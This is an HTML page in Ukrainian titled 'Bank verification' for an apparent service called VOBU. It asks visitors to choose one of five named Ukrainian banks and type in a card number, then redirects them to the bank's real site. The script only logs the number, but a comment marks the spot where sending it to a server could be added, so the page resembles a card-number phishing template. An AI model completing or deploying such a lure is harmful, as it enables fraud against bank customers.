<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Банківська верифікація | VOBU</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-blue: #0061ff;
            --dark-blue: #0047b3;
            --light-blue: #00c6fb;
            --green: #00d2a8;
            --dark-green: #00a896;
            --gradient-blue: linear-gradient(135deg, var(--primary-blue) 0%, var(--light-blue) 100%);
            --gradient-green: linear-gradient(135deg, var(--green) 0%, var(--dark-green) 100%);
            --gradient-bg: linear-gradient(135deg, #f0f9ff 0%, #e6f9ff 50%, #f0fff4 100%);
            --card-shadow: 0 10px 30px rgba(0, 97, 255, 0.15);
            --transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.1);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Montserrat', sans-serif;
            background: var(--gradient-bg);
            background-size: 200% 200%;
            animation: gradientBG 15s ease infinite;
            color: #333;
            min-height: 100vh;
            line-height: 1.6;
            padding: 0;
            margin: 0;
        }

        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .container {
            max-width: 1000px;
            margin: 0 auto;
            padding: 2rem;
        }

        header {
            text-align: center;
            margin-bottom: 3rem;
            padding-top: 2rem;
        }

        .logo {
            height: 240px;
            margin-bottom: 1rem;
        }

        h1 {
            font-size: 2.5rem;
            font-weight: 700;
            background: var(--gradient-blue);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            margin-bottom: 0.5rem;
        }

        .subtitle {
            font-size: 1.1rem;
            color: #555;
            max-width: 600px;
            margin: 0 auto;
        }

        /* Стилі для вибору статусу */
        .status-section {
            margin-bottom: 2rem;
        }

        .status-title {
            font-size: 1.5rem;
            color: var(--primary-blue);
            margin-bottom: 1.5rem;
            text-align: center;
            font-weight: 600;
        }

        .status-list {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 1rem;
            list-style: none;
        }

        .status-item {
            display: flex;
            align-items: center;
            padding: 1rem 1.5rem;
            background: rgba(0, 97, 255, 0.05);
            border-radius: 12px;
            transition: var(--transition);
            cursor: pointer;
            border: 2px solid transparent;
        }

        .status-item:hover {
            transform: translateY(-3px);
            background: rgba(0, 97, 255, 0.1);
            box-shadow: 0 5px 15px rgba(0, 97, 255, 0.1);
        }

        .status-item.selected {
            background: rgba(0, 97, 255, 0.1);
            border-color: var(--primary-blue);
            box-shadow: 0 0 0 3px rgba(0, 97, 255, 0.2);
        }

        .status-icon {
            margin-right: 1rem;
            color: var(--green);
            font-weight: bold;
            font-size: 1.2rem;
        }

        .status-text {
            font-weight: 500;
        }

        /* Карточка формы */
        .form-card {
            background: white;
            border-radius: 20px;
            box-shadow: var(--card-shadow);
            padding: 3rem;
            margin-bottom: 2rem;
            transition: var(--transition);
            position: relative;
            overflow: hidden;
        }

        .form-card::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 8px;
            background: var(--gradient-blue);
        }

        .form-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 35px rgba(0, 97, 255, 0.2);
        }

        .form-section {
            display: none;
        }

        .form-section.active {
            display: block;
            animation: fadeIn 0.6s ease-out;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .form-title {
            font-size: 1.8rem;
            font-weight: 600;
            color: var(--primary-blue);
            margin-bottom: 2rem;
            text-align: center;
        }

        /* Поля формы */
        .form-group {
            margin-bottom: 1.8rem;
        }

        .form-group label {
            display: block;
            margin-bottom: 0.8rem;
            font-weight: 500;
            color: #444;
            font-size: 1rem;
        }

        .form-control {
            width: 100%;
            padding: 1.2rem 1.5rem;
            border: 2px solid #e0e9ff;
            border-radius: 12px;
            font-size: 1rem;
            transition: var(--transition);
            background-color: #f8fbff;
            font-family: 'Montserrat', sans-serif;
        }

        .form-control:focus {
            outline: none;
            border-color: var(--primary-blue);
            background-color: white;
            box-shadow: 0 0 0 4px rgba(0, 97, 255, 0.1);
        }

        /* Специальное поле для номера карты */
        .card-number-input {
            position: relative;
        }

        .card-number-input .form-control {
            padding-left: 3.5rem;
            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="16" viewBox="0 0 24 16"><path fill="%230061ff" d="M21 0H3C1.3 0 0 1.3 0 3v10c0 1.7 1.3 3 3 3h18c1.7 0 3-1.3 3-3V3c0-1.7-1.3-3-3-3zm0 13c0 .6-.4 1-1 1H4c-.6 0-1-.4-1-1V5h18v8zm0-10H3V3c0-.6.4-1 1-1h16c.6 0 1 .4 1 1v1z"/></svg>');
            background-repeat: no-repeat;
            background-position: 1rem center;
            background-size: 24px;
            letter-spacing: 1px;
            font-family: 'Courier New', monospace;
            font-weight: 600;
        }

        .card-number-input .form-control::placeholder {
            color: #a0b4d0;
            font-weight: normal;
            letter-spacing: normal;
        }

        /* Загрузка файлов */
        .file-upload-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 1.5rem;
            margin-bottom: 2rem;
        }

        @media (max-width: 768px) {
            .file-upload-container {
                grid-template-columns: 1fr;
            }
        }

        .file-upload {
            border: 2px dashed #c2ddff;
            border-radius: 15px;
            padding: 2rem;
            text-align: center;
            cursor: pointer;
            transition: var(--transition);
            background-color: #f8fbff;
            position: relative;
            overflow: hidden;
        }

        .file-upload:hover {
            border-color: var(--primary-blue);
            background-color: rgba(0, 97, 255, 0.03);
            transform: translateY(-3px);
        }

        .file-upload input {
            display: none;
        }

        .file-upload-icon {
            font-size: 2.5rem;
            color: var(--primary-blue);
            margin-bottom: 1rem;
            transition: var(--transition);
        }

        .file-upload-label {
            font-weight: 600;
            color: var(--primary-blue);
            margin-bottom: 0.5rem;
            display: block;
        }

        .file-upload-desc {
            color: #777;
            font-size: 0.9rem;
            margin-bottom: 1rem;
        }

        .file-name {
            font-size: 0.9rem;
            color: #555;
            margin-top: 0.5rem;
            word-break: break-all;
        }

        .file-preview {
            width: 100%;
            max-height: 150px;
            object-fit: contain;
            border-radius: 8px;
            margin-top: 1rem;
            display: none;
        }

        /* Кнопки */
        .btn {
            display: inline-block;
            padding: 1.2rem 2.5rem;
            border-radius: 12px;
            font-weight: 600;
            text-align: center;
            cursor: pointer;
            transition: var(--transition);
            border: none;
            font-size: 1.1rem;
            font-family: 'Montserrat', sans-serif;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .btn-primary {
            background: var(--gradient-blue);
            color: white;
            box-shadow: 0 4px 15px rgba(0, 97, 255, 0.3);
        }

        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(0, 97, 255, 0.4);
        }

        .btn-secondary {
            background: white;
            color: var(--primary-blue);
            border: 2px solid var(--primary-blue);
        }

        .btn-secondary:hover {
            background: rgba(0, 97, 255, 0.05);
        }

        .btn-group {
            display: flex;
            gap: 1rem;
            margin-top: 2rem;
            justify-content: center;
        }

        /* Экран загрузки */
        .loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.4s ease;
        }

        .loading-screen.active {
            opacity: 1;
            pointer-events: all;
        }

        .loader {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(0, 97, 255, 0.2);
            border-radius: 50%;
            border-top-color: var(--primary-blue);
            animation: spin 1s ease-in-out infinite;
            margin-bottom: 2rem;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .loading-text {
            font-size: 1.2rem;
            color: var(--primary-blue);
            font-weight: 500;
            margin-top: 1rem;
        }

        /* Выбор банка */
        .bank-selection {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
            gap: 1.5rem;
            margin: 2rem 0;
        }

        .bank-card {
            background: white;
            border-radius: 15px;
            padding: 1.5rem;
            text-align: center;
            cursor: pointer;
            transition: var(--transition);
            border: 2px solid #e0e9ff;
            position: relative;
            overflow: hidden;
        }

        .bank-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0, 97, 255, 0.1);
            border-color: var(--primary-blue);
        }

        .bank-card.selected {
            border-color: var(--primary-blue);
            background-color: #f0f7ff;
            box-shadow: 0 0 0 3px rgba(0, 97, 255, 0.2);
        }

        .bank-logo {
            height: 50px;
            margin-bottom: 1rem;
            object-fit: contain;
            transition: var(--transition);
        }

        .bank-name {
            font-weight: 600;
            color: #333;
            margin-top: 0.5rem;
        }

        /* Успешное завершение */
        .success-screen {
            text-align: center;
            padding: 3rem 0;
        }

        .success-icon {
            font-size: 5rem;
            color: var(--green);
            margin-bottom: 1.5rem;
            animation: bounce 1s ease;
        }

        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-20px); }
            60% { transform: translateY(-10px); }
        }

        .success-title {
            font-size: 2rem;
            font-weight: 700;
            color: var(--green);
            margin-bottom: 1rem;
            background: var(--gradient-green);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .success-message {
            font-size: 1.1rem;
            color: #555;
            max-width: 500px;
            margin: 0 auto 2rem;
        }

        /* Адаптивность */
        @media (max-width: 768px) {
            .container {
                padding: 1.5rem;
            }

            .form-card {
                padding: 2rem 1.5rem;
            }

            h1 {
                font-size: 2rem;
            }

            .btn-group {
                flex-direction: column;
            }

            .btn {
                width: 100%;
            }

            .status-list {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <img src="logo.png" alt="Логотип VOBU" class="logo">
            <h1>Банківська верифікація</h1>
            <p class="subtitle">Оберіть ваш банк для подальшої обробки</p>
        </header>

        <!-- Форма выбора банка -->
        <div class="form-card">
            <div id="bank-section" class="form-section active">
                <h2 class="form-title">Оберіть ваш банк</h2>

                <div class="bank-selection">
                    <div class="bank-card" data-bank="privatbank" data-url="https://privatbank.ua">
                        <img src="privat.png" alt="ПриватБанк" class="bank-logo">
                        <div class="bank-name">ПриватБанк</div>
                    </div>

                    <div class="bank-card" data-bank="monobank" data-url="https://www.monobank.ua">
                        <img src="mono.png" alt="Монобанк" class="bank-logo">
                        <div class="bank-name">Монобанк</div>
                    </div>

                    <div class="bank-card" data-bank="oschadbank" data-url="https://www.oschadbank.ua">
                        <img src="oshad.png" alt="Ощадбанк" class="bank-logo">
                        <div class="bank-name">Ощадбанк</div>
                    </div>

                    <div class="bank-card" data-bank="raiffeisen" data-url="https://raiffeisen.ua">
                        <img src="raif.png" alt="Райффайзен" class="bank-logo">
                        <div class="bank-name">Райффайзен</div>
                    </div>

                    <div class="bank-card" data-bank="pumb" data-url="https://www.pumb.ua">
                        <img src="pumb.png" alt="ПУМБ" class="bank-logo">
                        <div class="bank-name">ПУМБ</div>
                    </div>
                </div>

                <div class="form-group card-number-input">
                    <label for="cardNumber">Номер вашої картки:</label>
                    <input type="text" id="cardNumber" class="form-control" placeholder="0000 0000 0000 0000" required>
                </div>

                <div class="btn-group">
                    <button id="submitBtn" class="btn btn-primary">Перейти до банку</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Экран загрузки -->
    <div class="loading-screen" id="loadingScreen">
        <div class="loader"></div>
        <div class="loading-text">Перенаправлення до банку...</div>
    </div>

    <script>
        // DOM элементы
        const bankSection = document.getElementById('bank-section');
        const submitBtn = document.getElementById('submitBtn');
        const loadingScreen = document.getElementById('loadingScreen');
        const formCard = document.querySelector('.form-card');
        const cardNumberInput = document.getElementById('cardNumber');

        // Выбор банка
        const bankCards = document.querySelectorAll('.bank-card');
        let selectedBank = null;
        let selectedBankUrl = null;

        // Обработчики событий для банков
        bankCards.forEach(card => {
            card.addEventListener('click', function() {
                bankCards.forEach(c => c.classList.remove('selected'));
                this.classList.add('selected');
                selectedBank = this.getAttribute('data-bank');
                selectedBankUrl = this.getAttribute('data-url');
            });
        });

        // Отправка формы
        submitBtn.addEventListener('click', async function() {
            if (!selectedBank || !cardNumberInput.value) {
                alert('Будь ласка, оберіть ваш банк та введіть номер картки');
                return;
            }

            // Показываем экран загрузки
            loadingScreen.classList.add('active');

            // Имитируем загрузку (1 секунда) и перенаправляем
            setTimeout(() => {
                // Здесь можно добавить отправку данных на сервер
                console.log('Отправленные данные:', {
                    bank: selectedBank,
                    cardNumber: cardNumberInput.value
                });

                // Перенаправление на сайт банка
                window.location.href = selectedBankUrl;
            }, 1000);
        });

        // Форматирование номера карты
        cardNumberInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
            let formatted = '';

            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) {
                    formatted += ' ';
                }
                formatted += value[i];
            }

            e.target.value = formatted.substring(0, 19);
        });
    </script>
</body>
</html>
